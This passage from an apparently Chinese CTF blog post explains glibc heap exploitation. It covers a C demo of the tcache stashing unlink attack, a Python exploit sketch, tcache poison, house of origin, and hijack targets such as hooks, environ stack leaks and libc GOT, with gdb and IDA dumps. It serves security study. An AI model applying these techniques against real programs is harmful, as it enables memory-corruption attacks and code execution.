stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">calloc(<span class="number">0xa0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    calloc(<span class="number">0xa0</span>)</span><br><span class="line">    free(i)</span><br><span class="line">calloc(<span class="number">0x4b0</span>) <span class="comment"># 9 </span></span><br><span class="line">calloc(<span class="number">0xb0</span>) <span class="comment"># 10</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">calloc(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">calloc(<span class="number">0x4b0</span>) <span class="comment"># 11</span></span><br><span class="line">calloc(<span class="number">0xb0</span>) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">calloc(<span class="number">0x400</span>) <span class="comment">#13</span></span><br><span class="line">edit(<span class="number">13</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x400</span>+p64(prev_size)+p64(size)+p64(target_add-<span class="number">0x10</span>))</span><br><span class="line">calloc(<span class="number">0xa0</span>)</span><br></pre></td></tr></table></figure><p><strong>限制:</strong></p><ul><li>需要UAF</li><li>主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便</li></ul><p><strong>效果:</strong></p><ul><li>获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。</li><li>在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。</li></ul><h2 id="tcache-poison">tcache poison</h2><p>主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。</p><h2 id="house-of-origin">house of origin</h2><p>house of origin 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。</p><p>一般而言，修改top chunk需要满足一下条件。</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><h1>攻击面</h1><ul><li>劫持控制流<ul><li>hooks</li><li>stack</li><li>IO_FILE</li><li>dlts</li><li>libc.got</li></ul></li><li>辅助攻击链<ul><li>tcache_perthread_struct</li><li>global_max_fast</li><li>heap 管理结构</li></ul></li></ul><h2 id="劫持控制流">劫持控制流</h2><h3 id="hooks">hooks</h3><p>堆利用中最基本的夺取控制流的方法就是打各种hooks。<br>一般而言，可以利用__free_hook 加 写入’/bin/sh’的堆快实现劫持。</p><p>此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件</p><p>而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。</p><h3 id="stack">stack</h3><p>在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。</p><p>我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。</p><p>查看glibc源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !_LIBC</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __environenviron</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> HAVE_ENVIRON_DECL</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>发现这是一个extern变量，在gdb中调试查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x7f78a14d4000</span>     <span class="number">0x7f78a1500000</span> r--p    <span class="number">2</span>c000      <span class="number">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a1500000</span>     <span class="number">0x7f78a1668000</span> r-xp   <span class="number">168000</span>  <span class="number">2</span>c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a1668000</span>     <span class="number">0x7f78a16bd000</span> r--p    <span class="number">55000</span> <span class="number">194000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16bd000</span>     <span class="number">0x7f78a16be000</span> ---p     <span class="number">1000</span> <span class="number">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16be000</span>     <span class="number">0x7f78a16c1000</span> r--p     <span class="number">3000</span> <span class="number">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16c1000</span>     <span class="number">0x7f78a16c4000</span> rw-p     <span class="number">3000</span> <span class="number">1</span>ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16c4000</span>     <span class="number">0x7f78a16d3000</span> rw-p     f000      <span class="number">0</span> [anon_7f78a16c4]</span><br><span class="line">    <span class="number">0x7f78a16d3000</span>     <span class="number">0x7f78a16d4000</span> r--p     <span class="number">1000</span>      <span class="number">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a16d4000</span>     <span class="number">0x7f78a16f8000</span> r-xp    <span class="number">24000</span>   <span class="number">1000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a16f8000</span>     <span class="number">0x7f78a1702000</span> r--p     a000  <span class="number">25000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a1702000</span>     <span class="number">0x7f78a1704000</span> r--p     <span class="number">2000</span>  <span class="number">2e000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a1704000</span>     <span class="number">0x7f78a1706000</span> rw-p     <span class="number">2000</span>  <span class="number">30000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7ffd6bb9e000</span>     <span class="number">0x7ffd6bbc0000</span> rw-p    <span class="number">22000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffd6bbd4000</span>     <span class="number">0x7ffd6bbd8000</span> r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line">    <span class="number">0x7ffd6bbd8000</span>     <span class="number">0x7ffd6bbda000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span>      <span class="number">0</span> [vsyscall]</span><br><span class="line">pwndbg&gt; p environ</span><br><span class="line">$<span class="number">1</span> = (<span class="type">char</span> **) <span class="number">0x7ffd6bbbdfc8</span></span><br><span class="line">pwndbg&gt; p &amp;environ</span><br><span class="line">$<span class="number">2</span> = (<span class="type">char</span> ***) <span class="number">0x7f78a16c9ec0</span> &lt;environ&gt;</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）</p><p>既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。</p><p>此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。</p><h3 id="libc-got">libc.got</h3><p>checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec libc.so.6       </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。</p><p>以下的got表来自libc2.34</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:<span class="number">00000000001</span>ED000 ; Segment type: Pure data</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 _got_plt        segment qword public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000                 assume cs:_got_plt</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000                 ;org <span class="number">1</span>ED000h</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED008 qword_1ED008    dq <span class="number">0</span>                    ; DATA XREF: sub_2C000↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED010 qword_1ED010    dq <span class="number">0</span>                    ; DATA XREF: sub_2C000+<span class="number">6</span>↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018 off_1ED018      dq offset __strnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018                                         ; DATA XREF: j___strnlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020 off_1ED020      dq offset __rawmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED028 off_1ED028      dq offset __GI___libc_realloc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED028                                         ; DATA XREF: _realloc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030 off_1ED030      dq offset __strncasecmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED038 off_1ED038      dq offset _dl_exception_create</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED038                                         ; DATA XREF: __dl_exception_create↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040 off_1ED040      dq offset __mempcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048 off_1ED048      dq offset __wmemset_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048                                         ; DATA XREF: j___wmemset_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED058                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED060                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068 off_1ED068      dq offset __libc_memmove_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070 off_1ED070      dq offset __wmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078 off_1ED078      dq offset __stpcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080 off_1ED080      dq offset __wmemcmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED088 off_1ED088      dq offset _dl_find_dso_for_object</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED090                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED098                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0 off_1ED0B0      dq offset __wcschr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0 off_1ED0C0      dq offset __memrchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D0 off_1ED0D0      dq offset __tls_get_addr</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D0                                         ; DATA XREF: ___tls_get_addr↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8 off_1ED0D8      dq offset __wmemset_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F0 off_1ED0F0      dq offset _dl_fatal_printf</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100 off_1ED100      dq offset __wcscpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED108                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110 off_1ED110      dq offset __strcasecmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED118                                         ; Indirect relocation</span><br><span 